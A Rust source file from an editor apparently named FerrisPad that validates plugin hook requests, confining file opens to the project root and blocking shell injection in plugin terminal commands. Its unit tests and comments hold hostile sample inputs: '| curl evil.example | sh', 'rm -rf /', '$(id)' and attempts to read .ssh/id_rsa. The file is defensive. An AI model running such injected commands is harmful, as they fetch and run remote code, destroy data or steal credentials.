//! Free functions for processing plugin hook results.
//!
//! Extracted from AppState to be callable from both AppState and WidgetController.

use fltk::app::Sender;

use crate::app::controllers::tabs::TabManager;
use crate::app::controllers::view::ViewController;
use crate::app::domain::messages::Message;
use crate::app::plugins::{HookResult, TerminalViewRequest, WidgetManager};

/// Bundles the mutable references needed by hook/lint result processing.
pub struct HookContext<'a> {
    pub tab_manager: &'a mut TabManager,
    pub view: &'a mut ViewController,
    pub widget_manager: &'a mut WidgetManager,
    pub sender: Sender<Message>,
    /// Approved commands for the source plugin (used by terminal_view security check).
    pub approved_commands: Vec<String>,
}

/// Process the result from a plugin hook (diagnostics, annotations, status message, open_file, clipboard, goto_line).
pub fn dispatch_hook_result(result: HookResult, plugin_name: &str, ctx: &mut HookContext<'_>) {
    // Handle modified content (for format actions)
    if let Some(modified_content) = result.modified_content
        && let Some(doc) = ctx.tab_manager.active_doc()
    {
        let mut buf = doc.buffer.clone();
        buf.set_text(&modified_content);
    }

    // Update diagnostics — send even when empty if a lint plugin ran,
    // so the diagnostic panel shows "All checks passed"
    if !result.diagnostics.is_empty() || result.had_lint_results {
        ctx.sender
            .send(Message::DiagnosticsUpdate(result.diagnostics));
    }

    // Update line annotations
    if !result.line_annotations.is_empty() {
        ctx.sender
            .send(Message::AnnotationsUpdate(result.line_annotations));
    }

    // Show status message
    if let Some(status) = result.status_message {
        ctx.sender
            .send(Message::ToastShow(status.level, status.text));
    }

    // Handle open_file request with security validation
    if let Some(ref file_path) = result.open_file {
        use crate::app::plugins::security::find_project_root;

        // Determine project root from current document
        let project_root = ctx
            .tab_manager
            .active_doc()
            .and_then(|d| d.file_path.as_ref())
            .and_then(|p| find_project_root(std::path::Path::new(p)));

        match approve_open_file(file_path, project_root.as_deref()) {
            Some(path) => {
                eprintln!("[plugin:{}] open_file approved: {}", plugin_name, path);
                ctx.sender.send(Message::DeferredOpenFile(path));
            }
            None => {
                eprintln!(
                    "[plugin:security] open_file BLOCKED for '{}': '{}'",
                    plugin_name, file_path
                );
            }
        }
    }

    // Handle clipboard_text request
    if let Some(ref text) = result.clipboard_text {
        crate::app::infrastructure::platform::copy_to_clipboard(text);
    }

    // Handle goto_line request
    if let Some(line) = result.goto_line
        && let Some(doc) = ctx.tab_manager.active_doc()
    {
        let buf = doc.buffer.clone();
        ctx.view.goto_line(&buf, line);
    }
}

/// What a plugin's `open_file` request may open (T0090): the validated,
/// physical path of an existing file inside the active document's project
/// root, or `None` to block it.
///
/// The opener gets the resolved path, never the raw plugin string, which
/// would resolve against the process cwd instead of the root. Without a
/// project root (untitled document, file outside any project) the request
/// is refused: there is nothing to confine it to, like every other plugin
/// filesystem API.
pub(crate) fn approve_open_file(
    file_path: &str,
    project_root: Option<&std::path::Path>,
) -> Option<String> {
    use crate::app::plugins::security::{PathValidation, validate_path};
    match validate_path(file_path, project_root?) {
        PathValidation::Valid(path) if path.is_file() => Some(path.to_string_lossy().into_owned()),
        _ => None,
    }
}

/// Process lint result from plugin hook: send diagnostics, annotations, and toast.
pub fn dispatch_lint_result(result: HookResult, ctx: &mut HookContext<'_>) {
    // Process any widget requests (e.g., tree view updates from on_document_lint)
    process_widget_requests(
        &result,
        "",
        &ctx.approved_commands,
        ctx.widget_manager,
        ctx.sender,
    );

    // Only send diagnostics if at least one plugin actually linted this file.
    if result.had_lint_results {
        ctx.sender
            .send(Message::DiagnosticsUpdate(result.diagnostics));

        // Update or clear annotations
        if !result.line_annotations.is_empty() {
            ctx.sender
                .send(Message::AnnotationsUpdate(result.line_annotations));
        } else {
            // Clear any existing annotations when no issues found
            ctx.sender.send(Message::AnnotationsClear);
        }
    }

    if let Some(status) = result.status_message {
        ctx.sender
            .send(Message::ToastShow(status.level, status.text));
    }
}

/// Process widget requests (split view, tree view, terminal view) from a hook result.
///
/// `approved_commands` is the plugin's list of user-approved commands.
/// Terminal view requests are only allowed if the command is in this list.
pub fn process_widget_requests(
    result: &HookResult,
    plugin_name: &str,
    approved_commands: &[String],
    widget_manager: &mut WidgetManager,
    sender: Sender<Message>,
) {
    // Use source_plugin from broadcast hooks when caller passes ""
    let effective_name = if plugin_name.is_empty() {
        result.source_plugin.as_deref().unwrap_or("")
    } else {
        plugin_name
    };

    // Check for split view request
    if let Some(ref split_request) = result.split_view
        && split_request.is_valid()
    {
        let session_id = widget_manager.create_split_view_session(effective_name);
        sender.send(Message::SplitViewShow {
            session_id,
            plugin_name: effective_name.to_string(),
            request: split_request.clone(),
        });
    }

    // Check for tree view request
    if let Some(ref tree_request) = result.tree_view
        && tree_request.is_valid()
    {
        let session_id =
            widget_manager.create_tree_view_session(effective_name, tree_request.persistent);
        sender.send(Message::TreeViewShow {
            session_id,
            plugin_name: effective_name.to_string(),
            request: tree_request.clone(),
        });
    }

    // Check for terminal view request — with security checks
    if let Some(ref terminal_request) = result.terminal_view
        && terminal_request.is_valid()
    {
        // Every field of a plugin terminal_view request is untrusted. Fail
        // closed on anything that isn't an approved, metacharacter-free
        // command with metacharacter-free args and working_dir.
        if let Err(reason) = validate_terminal_request(terminal_request, approved_commands) {
            eprintln!(
                "[plugin:security] '{}' terminal_view blocked: {}",
                effective_name, reason
            );
            sender.send(Message::ToastShow(
                crate::ui::toast::ToastLevel::Error,
                format!("Plugin '{}': terminal blocked ({})", effective_name, reason),
            ));
            return;
        }

        // Reuse existing terminal view session if one exists
        let session_id = if let Some(existing_id) = widget_manager.any_terminal_view_session() {
            existing_id
        } else {
            widget_manager.create_terminal_view_session(effective_name, terminal_request.persistent)
        };
        sender.send(Message::TerminalViewShow {
            session_id,
            plugin_name: effective_name.to_string(),
            request: terminal_request.clone(),
        });
    }
}

/// Fail-closed security gate for a plugin-issued `terminal_view` request.
///
/// Returns `Ok(())` only when the command is on the plugin's user-approved
/// list and neither the command, its arguments, nor an explicit working
/// directory contain shell metacharacters. Every rejection carries a
/// human-readable reason.
///
/// Plugin input is untrusted: this is the gate that stops a plugin granted one
/// benign command (e.g. `git`) from smuggling `git status; curl x | sh` in
/// through unchecked `args`.
fn validate_terminal_request(
    request: &TerminalViewRequest,
    approved_commands: &[String],
) -> Result<(), String> {
    use crate::app::plugins::security::validate_command_arg;

    // Raw shell access (command = None) is never allowed for plugins.
    let Some(cmd) = request.command.as_deref() else {
        return Err("default shell terminal is not allowed for plugins".to_string());
    };

    // The command name must be free of shell metacharacters...
    validate_command_arg(cmd).map_err(|e| format!("command '{}' rejected: {}", cmd, e))?;

    // ...and on the plugin's user-approved list (compared by basename so
    // "/path/to/venv/bin/ruff" still matches an approved "ruff").
    let cmd_basename = std::path::Path::new(cmd)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or(cmd);
    if !approved_commands
        .iter()
        .any(|c| c == cmd_basename || c == cmd)
    {
        return Err(format!("command '{}' not approved", cmd_basename));
    }

    // Every argument is untrusted and must clear the same metacharacter gate.
    // This is the hole that allowed shell injection through an approved command.
    for arg in &request.args {
        validate_command_arg(arg).map_err(|e| format!("argument '{}' rejected: {}", arg, e))?;
    }

    // A plugin-supplied working directory must also be metacharacter-free. When
    // the plugin leaves it unset, FerrisPad fills in the discovered project root
    // later — that trusted path is not subject to this check.
    if let Some(dir) = request.working_dir.as_deref() {
        validate_command_arg(dir).map_err(|e| format!("working_dir '{}' rejected: {}", dir, e))?;
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── T0090: plugin open_file requests ─────────────────────────────

    #[test]
    fn hook_open_file_opens_the_validated_path_not_the_raw_one() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir(root.join("src")).unwrap();
        std::fs::write(root.join("src/main.rs"), "fn main() {}").unwrap();
        let canonical = std::fs::canonicalize(root.join("src/main.rs")).unwrap();
        // A relative path must not reach the opener as-is: it would resolve
        // against the process cwd, not the project root.
        assert_eq!(
            approve_open_file("src/main.rs", Some(root)),
            Some(canonical.to_string_lossy().into_owned())
        );
    }

    #[test]
    fn hook_open_file_refuses_paths_that_are_not_existing_files_in_root() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // `.ssh/id_rsa` does not exist under the root: with FerrisPad started
        // from $HOME the raw string would open ~/.ssh/id_rsa.
        assert_eq!(approve_open_file(".ssh/id_rsa", Some(root)), None);
        assert_eq!(approve_open_file(".bashrc", Some(root)), None);
        std::fs::create_dir(root.join("dir")).unwrap();
        assert_eq!(approve_open_file("dir", Some(root)), None, "not a file");
        assert_eq!(approve_open_file("/etc/hostname", Some(root)), None);
    }

    #[test]
    fn hook_open_file_without_project_root_is_refused() {
        assert_eq!(approve_open_file("/etc/hostname", None), None);
        assert_eq!(approve_open_file(".ssh/id_rsa", None), None);
    }

    fn req(command: Option<&str>, args: &[&str], working_dir: Option<&str>) -> TerminalViewRequest {
        TerminalViewRequest {
            title: "t".to_string(),
            command: command.map(str::to_string),
            args: args.iter().map(|s| s.to_string()).collect(),
            working_dir: working_dir.map(str::to_string),
            persistent: false,
        }
    }

    #[test]
    fn approved_clean_command_is_allowed() {
        let request = req(Some("git"), &["status"], None);
        assert!(validate_terminal_request(&request, &["git".to_string()]).is_ok());
    }

    #[test]
    fn unapproved_command_is_rejected() {
        let request = req(Some("rm"), &["-rf", "/"], None);
        assert!(validate_terminal_request(&request, &["git".to_string()]).is_err());
    }

    #[test]
    fn default_shell_command_none_is_rejected() {
        let request = req(None, &[], None);
        assert!(validate_terminal_request(&request, &["git".to_string()]).is_err());
    }

    #[test]
    fn metacharacters_in_command_name_are_rejected() {
        let request = req(Some("git; id"), &[], None);
        assert!(validate_terminal_request(&request, &["git".to_string()]).is_err());
    }

    // Regression (T0001, audit S3): a plugin granted the single approved command
    // `git` must NOT be able to smuggle shell code through an argument. Before
    // the fix `args` were passed through unchecked and `pty.rs` ran them via
    // `$SHELL -lc "<git status; touch pwned>"` — full RCE.
    #[test]
    fn shell_injection_in_args_is_rejected() {
        let request = req(Some("git"), &["status; touch /tmp/ferrispad_pwned"], None);
        assert!(
            validate_terminal_request(&request, &["git".to_string()]).is_err(),
            "injected shell metacharacters in args must be rejected"
        );
    }

    #[test]
    fn pipe_injection_in_args_is_rejected() {
        let request = req(Some("git"), &["log", "| curl evil.example | sh"], None);
        assert!(validate_terminal_request(&request, &["git".to_string()]).is_err());
    }

    #[test]
    fn shell_injection_in_working_dir_is_rejected() {
        let request = req(Some("git"), &["status"], Some("/tmp/$(id)"));
        assert!(validate_terminal_request(&request, &["git".to_string()]).is_err());
    }
}
